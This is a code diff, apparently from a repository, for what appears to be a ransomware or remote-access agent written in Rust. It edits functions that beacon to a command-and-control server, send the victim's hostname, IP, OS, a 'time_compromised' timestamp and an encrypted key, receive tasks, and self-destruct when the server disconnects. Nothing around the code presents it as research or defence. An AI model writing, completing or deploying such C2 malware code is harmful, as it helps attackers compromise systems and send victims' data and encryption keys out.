@@ -39,7 +39,7 @@ async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> R
 }
 
 /// Beacon C2 and send victim info and encrypted key to C2
-pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64, logger: &Logger, key: Vec<u8>) -> (u64, String) {
+pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64, logger: &Logger, key: &Vec<u8>) -> (u64, String) {
     let beacon = match get_info(key).await {
         Ok(beacon) => beacon,
         Err(e) => {
@@ -93,8 +93,7 @@ pub async fn heartbeat(
             session_id: _ 
         })) => {
             logger.log("[*] Received NOOP from C2");
-            //println!("[*] Received NOOP from C2");
-            return None
+            return Some(vec![AgentCommand::NOOP])
         }
         Ok(Some(ServerMessage::Task { 
             agent_id: _, 
@@ -102,7 +101,6 @@ pub async fn heartbeat(
             command 
         })) => {
             logger.log("[*] Received tasks from C2");
-            //println!("[*] Received tasks from C2");
             return Some(command)
         }
         Ok(Some(ServerMessage::Disconnect { 
@@ -110,17 +108,14 @@ pub async fn heartbeat(
             session_id:_ 
         })) => {
             logger.log("[*] Received disconnect from C2");
-            //println!("[*] Received disconnect from C2");
             return Some(vec![AgentCommand::SelfDestruct])
         }
         Ok(Some(msg)) => {
             logger.error(&format!("[!] Unexpected message: {:?}", msg));
-            //eprintln!("[!] Unexpected message: {:?}", msg);
             return Some(vec![AgentCommand::InvalidTask])
         }
         Err(e) => {
             logger.error(&format!("[!] Beacon attempt failed: {}", e));
-            //eprintln!("[!] Beacon attempt failed: {}", e)
         }
         _ => {}
     }
@@ -166,7 +161,7 @@ pub async fn reconnect(addr: &str, agent_id: u64, session_id: &str, timeout: u64
     /// - `ip`: The public IP address of the system.
     /// - `os`: The operating system as a `String`.
     /// - `time_compromised`: The timestamp when the system was compromised, formatted as an RFC 3339 string.
-pub async fn get_info(key: Vec<u8>) -> Result<AgentMessage, Box<dyn std::error::Error>> {
+pub async fn get_info(key: &Vec<u8>) -> Result<AgentMessage, Box<dyn std::error::Error>> {
     let hostname = gethostname();
     let local_ip = local_ip()?;
     let os = std::env::consts::OS;
@@ -179,8 +174,8 @@ pub async fn get_info(key: Vec<u8>) -> Result<AgentMessage, Box<dyn std::error::
         hostname: hostname.to_string_lossy().to_string(), 
         ip: public_ip, 
         os: os.to_string(), 
-        time_compromised: chrono::Local::now().to_rfc3339(),
-        key
+        time_compromised: chrono::Utc::now().to_rfc3339(),
+        key: key.to_vec()
     };
 
     Ok(message)
